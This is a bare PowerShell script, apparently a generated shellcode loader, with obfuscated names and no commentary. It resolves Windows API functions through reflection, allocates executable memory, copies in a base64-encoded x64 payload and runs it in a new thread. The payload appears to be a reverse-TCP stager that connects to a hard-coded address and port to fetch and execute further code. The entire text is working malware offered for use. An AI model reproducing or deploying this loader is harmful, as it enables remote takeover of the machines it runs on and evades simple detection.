function mTxhG {
	Param ($h6, $re1v)		
	$rToM = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	
	return $rToM.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($rToM.GetMethod('GetModuleHandle')).Invoke($null, @($h6)))), $re1v))
}

function f8 {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $a_,
		[Parameter(Position = 1)] [Type] $b7JhP = [Void]
	)
	
	$bieM = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$bieM.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $a_).SetImplementationFlags('Runtime, Managed')
	$bieM.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $b7JhP, $a_).SetImplementationFlags('Runtime, Managed')
	
	return $bieM.CreateType()
}

[Byte[]]$nm_V = [System.Convert]::FromBase64String("/EiD5PDozAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0FBEi0AgSQHQi0gY41ZNMclI/8lBizSISAHWSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCABFcwKh8gUFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoKQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0Ckn/znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gAfShYQVdZaABAAABBWGoAWkG6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dYagBZScfC8LWiVv/V")
		
$x0QBp = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((mTxhG kernel32.dll VirtualAlloc), (f8 @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $nm_V.Length,0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($nm_V, 0, $x0QBp, $nm_V.length)

$qrlM = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((mTxhG kernel32.dll CreateThread), (f8 @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$x0QBp,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((mTxhG kernel32.dll WaitForSingleObject), (f8 @([IntPtr], [Int32]))).Invoke($qrlM,0xffffffff) | Out-Null
